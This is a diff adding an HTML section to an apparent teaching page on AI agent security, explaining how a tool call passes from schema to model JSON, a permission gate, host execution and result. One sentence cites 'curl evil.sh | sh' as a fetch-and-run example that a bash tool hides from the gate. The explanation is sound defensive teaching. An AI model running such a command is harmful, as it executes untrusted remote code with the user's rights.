@@ -5544,6 +5544,110 @@
           </div>
         </section>
 
+        <!-- ── How a tool call actually executes: tools[] → tool_use → gate → exec → tool_result ── -->
+        <section id="ai-tool-call-anatomy">
+          <style>
+            #ai-tool-call-anatomy .tc-step{flex:1;background:rgba(255,255,255,0.03);border:1px solid #2a3550;border-radius:6px;padding:8px 10px;position:relative;}
+            #ai-tool-call-anatomy .tc-gate{border-color:#2de8a0;background:rgba(45,232,160,0.07);}
+            #ai-tool-call-anatomy .tc-arrow{align-self:center;color:#4a5e70;font-size:14pt;padding:0 2px;}
+            #ai-tool-call-anatomy .tc-num{font-size:8pt;font-weight:700;letter-spacing:.08em;}
+            #ai-tool-call-anatomy .tc-title{font-size:10pt;font-weight:700;color:#f8f9fa;margin:2px 0;}
+            #ai-tool-call-anatomy .tc-sub{font-size:7.5pt;color:#8099b0;line-height:1.35;}
+            #ai-tool-call-anatomy .tc-code{background:#0c1020;border:1px solid #2a3550;border-radius:6px;padding:8px 10px;font-family:var(--code-font,monospace);font-size:7.6pt;line-height:1.45;color:#cfe3ff;white-space:pre;overflow:hidden;}
+            #ai-tool-call-anatomy .tc-codehdr{font-size:7.5pt;font-weight:700;letter-spacing:.05em;margin-bottom:3px;}
+            #ai-tool-call-anatomy .k{color:#7fd6f5;} /* json key */
+            #ai-tool-call-anatomy .s{color:#9cdca0;} /* json string */
+            #ai-tool-call-anatomy .c{color:#5a7090;} /* comment / muted */
+          </style>
+          <h2 style="margin-bottom:2px;">How a Tool Call Actually Executes</h2>
+          <p style="margin:0 0 12px;font-size:0.72em;color:#5a7090;font-style:italic;">
+            The model emits <span style="color:#ffa830;">JSON</span>, never an action — the <span style="color:#00d9ff;">harness</span> runs it. The <span style="color:#2de8a0;">permission gate</span> is plain code that reads the JSON <em>between emit and exec</em>.
+          </p>
+
+          <!-- pipeline -->
+          <div style="display:flex;gap:4px;align-items:stretch;margin-bottom:14px;">
+            <div class="tc-step">
+              <div class="tc-num" style="color:#00d9ff;">1 · DEFINE</div>
+              <div class="tc-title">tools[] schema</div>
+              <div class="tc-sub">harness declares name + <code>input_schema</code> — developer-authored <strong style="color:#00d9ff;">trusted config</strong></div>
+            </div>
+            <div class="tc-arrow">→</div>
+            <div class="tc-step">
+              <div class="tc-num" style="color:#ffa830;">2 · EMIT</div>
+              <div class="tc-title">tool_use block</div>
+              <div class="tc-sub">model returns <code>{name, input}</code> + <code>stop_reason</code> — <strong style="color:#ffa830;">untrusted intent</strong>, just text</div>
+            </div>
+            <div class="tc-arrow">→</div>
+            <div class="tc-step tc-gate">
+              <div class="tc-num" style="color:#2de8a0;">3 · GATE 🛡</div>
+              <div class="tc-title">permission gate</div>
+              <div class="tc-sub">plain code inspects <code>name</code> + <code>input</code> → <strong style="color:#2de8a0;">allow / ask / deny</strong>. The boundary.</div>
+            </div>
+            <div class="tc-arrow">→</div>
+            <div class="tc-step">
+              <div class="tc-num" style="color:#ff6b35;">4 · EXEC</div>
+              <div class="tc-title">subprocess on host</div>
+              <div class="tc-sub"><code>bash -c "npm test"</code> runs with the <strong style="color:#ff6b35;">harness process's OS rights</strong> — i.e. yours</div>
+            </div>
+            <div class="tc-arrow">→</div>
+            <div class="tc-step">
+              <div class="tc-num" style="color:#ff4444;">5 · RETURN</div>
+              <div class="tc-title">tool_result</div>
+              <div class="tc-sub">stdout re-enters the context as <strong style="color:#ff4444;">untrusted input</strong> — loop repeats</div>
+            </div>
+          </div>
+
+          <!-- the three JSON blocks -->
+          <div style="display:grid;grid-template-columns:1fr 1fr 1fr;gap:10px;">
+            <div>
+              <div class="tc-codehdr" style="color:#00d9ff;">① REQUEST — what the harness defines</div>
+              <div class="tc-code"><span class="k">"tools"</span>: [{
+  <span class="k">"name"</span>: <span class="s">"run_bash"</span>,
+  <span class="k">"description"</span>: <span class="s">"Run a bash command"</span>,
+  <span class="k">"input_schema"</span>: {
+    <span class="k">"type"</span>: <span class="s">"object"</span>,
+    <span class="k">"properties"</span>: {
+      <span class="k">"command"</span>: { <span class="k">"type"</span>: <span class="s">"string"</span> }
+    },
+    <span class="k">"required"</span>: [<span class="s">"command"</span>]
+  }
+}]</div>
+            </div>
+            <div>
+              <div class="tc-codehdr" style="color:#ffa830;">② MODEL → tool_use (the "command")</div>
+              <div class="tc-code">{
+  <span class="k">"type"</span>: <span class="s">"tool_use"</span>,
+  <span class="k">"id"</span>: <span class="s">"toolu_01A09…"</span>,
+  <span class="k">"name"</span>: <span class="s">"run_bash"</span>,
+  <span class="k">"input"</span>: {
+    <span class="k">"command"</span>: <span class="s">"npm test"</span>
+  }
+}
+<span class="c">stop_reason: "tool_use"</span>
+
+<span class="c">↑ structured JSON — not a shell
+  string, not prose</span></div>
+            </div>
+            <div>
+              <div class="tc-codehdr" style="color:#ff4444;">③ HARNESS → tool_result (back to model)</div>
+              <div class="tc-code">{
+  <span class="k">"type"</span>: <span class="s">"tool_result"</span>,
+  <span class="k">"tool_use_id"</span>: <span class="s">"toolu_01A09…"</span>,
+  <span class="k">"content"</span>: <span class="s">"42 passing, 0 failing"</span>,
+  <span class="k">"is_error"</span>: false
+}
+
+<span class="c">tool_use_id ties the result to
+the call · output is now
+untrusted context (LLM01)</span></div>
+            </div>
+          </div>
+
+          <p style="margin:12px 0 0;font-size:8.5pt;color:#5a7090;line-height:1.5;">
+            <strong style="color:#2de8a0;">Why the shape matters:</strong> a <code>bash</code> tool hands the gate one opaque <code>command</code> string — same shape for <code>ls</code> and <code>curl evil.sh | sh</code>. Promote risky actions to <em>dedicated</em> tools (e.g. <code>send_email</code> with typed <code>to/subject/body</code>) so the gate has typed fields it can actually check. Anthropic's built-in <code>bash</code> tool (<code>type: "bash_20250124"</code>) ships the schema, but <strong>your harness still executes it</strong>.
+          </p>
+        </section>
+
         <!-- ── Agent Security: the anatomy diagram as an engineering checklist ── -->
         <section id="agent-security">
           <h2 style="margin-bottom:4px;">Agent Security</h2>
